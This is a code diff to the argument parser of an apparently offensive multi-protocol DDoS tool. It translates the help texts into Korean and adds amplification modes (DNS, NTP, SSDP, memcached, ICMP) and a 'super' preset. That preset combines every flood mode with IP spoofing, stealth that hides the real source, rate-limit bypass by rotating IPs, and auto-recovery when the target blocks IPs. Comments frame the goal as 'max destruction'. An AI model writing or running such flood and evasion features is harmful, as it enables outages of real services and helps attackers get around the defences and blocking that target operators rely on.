@@ -2447,51 +2447,51 @@ examples:
   dossal --mode raw --url http://target:8080 --duration 10 --report out.html --impact
 """)
     ap.add_argument("--mode", default="http",
-        help="Comma-separated modes: http,https,httpsmp,raw,h2,grpc,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris")
+        help="공격 모드 (쉼표로 다중): http,https,httpsmp,raw,h2,grpc,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris,h3mp,dns,icmp,ssdp,ntp,memcached")
     ap.add_argument("--auto", action="store_true",
-        help="Auto-detect target protocol and select optimal modes")
+        help="대상 프로토콜 자동 감지 + 최적 모드 선택")
     ap.add_argument("--combo", default=None,
-        choices=['web', 'full', 'tls', 'proto', 'amplify'],
-        help="Preset mode combo: web(raw+udp+syn), full(+rst), tls(httpsmp+h2+udp), proto(grpcmp+h2+udp), amplify(dns+icmp+ssdp+ntp+memcached)")
+        choices=['web', 'full', 'tls', 'proto', 'amplify', 'super'],
+        help="프리셋 조합: web(스피드+UDP+SYN), full(+RST), tls(TLS+H2+UDP), proto(gRPC+H2+UDP), amplify(확대5종), super(전체파워+스텔스+스피드)")
     ap.add_argument("--url", required=True)
     ap.add_argument("--targets", default=None,
-        help="Comma-separated multiple target URLs (attack all simultaneously). Overrides --url")
+        help="여러 대상 URL (쉼표 구분, 동시에 공격). --url보다 우선")
     ap.add_argument("--connections", type=int, default=100,
-        help="Connections per mode (default: 100)")
+        help="모드별 연결 수 (기본: 100)")
     ap.add_argument("--conns", default=None,
-        help='Per-mode connection overrides: "http=400,h2=80,udp=1,syn=10"')
+        help='모드별 연결 수 지정: "http=400,h2=80,udp=1,syn=10"')
     ap.add_argument("--duration", type=int, default=10)
     ap.add_argument("--payload-size", type=int, default=None,
-        help="Override default payload size (per mode)")
+        help="페이로드 크기 재지정 (모드별)")
     ap.add_argument("--impact", action="store_true",
-        help="Enable victim impact scoring (requires psutil)")
+        help="피해 임팩트 점수 계산 (psutil 필요)")
     ap.add_argument("--intensity", default="balanced",
         choices=["light", "balanced", "max"],
-        help="Preset: light(10c), balanced(50c), max(200c). Overrides default 100c.")
+        help="인텐시트 프리셋: light(10c), balanced(50c), max(200c). 기본 100c 상시")
     ap.add_argument("--live", action="store_true",
-        help="Print RPS/PPS every second during attack")
+        help="공격 중 실시간 RPS/PPS 출력 (1초 간격)")
     ap.add_argument("--report", default=None, metavar="FILE",
-        help="Generate HTML attack report to FILE")
+        help="HTML 공격 리포트 생성")
     ap.add_argument("--threads", type=int, default=None,
-        help="Multiprocess count (default: auto, max 32)")
+        help="멀티프로세스 수 (기본: 자동, 최대 32)")
     ap.add_argument("--src-ips", default=None,
-        help="Comma-separated source IPs to rotate (per-IP rate limit bypass). 'auto' = detect all local IPs")
+        help="순환할 소스 IP (쉼표 구분). 'auto' = 로컬 IP 자동 감지. per-IP 레이트리밋 우회")
     ap.add_argument("--spoof", type=int, default=0,
-        help="Generate N spoofed source IPs (RFC 5737 TEST-NET, unclaimed). Hides real IP, bypasses per-IP rate limit")
+        help="스푸핑 IP N개 생성 (RFC 5737). 실제 IP 숨김 + per-IP 레이트리밋 우회")
     ap.add_argument("--stealth", action="store_true",
-        help="Stealth mode: only use spoofed IPs, never expose real IP")
+        help="스텔스 모드: 스푸핑 IP만 사용, 실제 IP 절대 노출 안 함")
     ap.add_argument("--jitter", type=float, default=0.0, metavar="MS",
-        help="Random delay between requests in ms (0 = max speed, 5 = ~5ms jitter)")
+        help="요청 간 무작위 지연(ms). 0=최대 속도, 5=~5ms")
     ap.add_argument("--rotate-interval", type=float, default=5.0, metavar="SEC",
-        help="Seconds between IP rotation checks in stealth mode (default: 5s)")
+        help="IP 순환 검사 간격(초, 기본: 5s)")
     ap.add_argument("--recovery", action="store_true",
-        help="Auto-recovery: detect 429 responses, remove blocked IPs, continue with remaining")
+        help="자동회복: 429 감지 → 차단 IP 제거 → 나머지 IP로 계속")
     ap.add_argument("--pool", default=None, metavar="FILE",
-        help="File with source IPs (one per line, or host:port for proxy pool)")
+        help="소스 IP 파일 (1개씩 줄, 또는 프록시 풀 host:port)")
     ap.add_argument("--proxy", default=None, metavar="URL",
-        help="Proxy URL: http://host:port or socks5://user:pass@host:port. All traffic routes through proxy (hides real IP)")
+        help="프록시 URL: http://host:port 또는 socks5://user:pass@host:port. 전체 트래픽 프록시 경유")
     ap.add_argument("--dry-run", action="store_true",
-        help="Simulate: probe target, show predicted RPS/IP count, don't attack")
+        help="시뮬레이션: 대상 탐지, 예측 RPS/IP 수 표시, 공격 안 함")
     args = ap.parse_args()
 
     # Auto mode: probe target + always include L4 for max destruction
@@ -2502,10 +2502,24 @@ examples:
         'tls': 'httpsmp,h2,udp',
         'proto': 'grpcmp,h2,udp',
         'amplify': 'dns,icmp,ssdp,ntp,memcached',
+        'super': 'raw,httpsmp,h2,h3mp,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris,dns,icmp,ssdp,ntp,memcached',
     }
     if args.combo:
         args.mode = COMBOS[args.combo]
         print(f"[combo] {args.combo} -> {args.mode}", file=sys.stderr)
+        # 슈퍼 모드: 최대 전력 + 스텔스 + 자동회복 + 무작위 지연
+        if args.combo == 'super':
+            if not args.threads:
+                args.threads = 16
+            if not args.stealth:
+                args.stealth = True
+            if not args.recovery:
+                args.recovery = True
+            if args.jitter == 0:
+                args.jitter = 2.0
+            if args.spoof == 0:
+                args.spoof = 100
+            print("[SUPER] 최대 전력 + 스텔스 + 자동회복 + 100 스푸핑 IP + 2ms 지연", file=sys.stderr)
     
     # Dry-run: probe and predict, don't attack
     if args.dry_run:
